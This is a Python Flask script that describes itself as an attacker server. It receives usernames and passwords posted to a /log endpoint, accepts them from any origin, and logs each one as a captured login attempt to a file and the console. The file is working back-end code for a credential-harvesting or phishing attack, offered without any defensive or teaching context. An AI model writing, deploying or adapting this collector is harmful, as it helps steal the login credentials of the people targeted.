from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)


@app.route('/log', methods=['POST'])
def receive_credentials():
  data = request.json
  username = data.get('username')
  password = data.get('password')

  # Format the captured login attempt neatly
  log_entry = (
      '----------------------------------------\n'
      f'[!] CAPTURED LOGIN ATTEMPT:\n'
      f'    Username/Email: {username}\n'
      f'    Password:       {password}\n'
      '----------------------------------------\n'
  )

  # Write to local file on attacker's end
  with open('captured_keystrokes.txt', 'a', encoding='utf-8') as f:
    f.write(log_entry)

  print(f'[+] Captured Credentials -> User: {username} | Pass: {password}')
  return jsonify({'status': 'logged'}), 200


if __name__ == '__main__':
  print('[*] Attacker server running on http://localhost:5000')
  app.run(host='127.0.0.1', port=5000)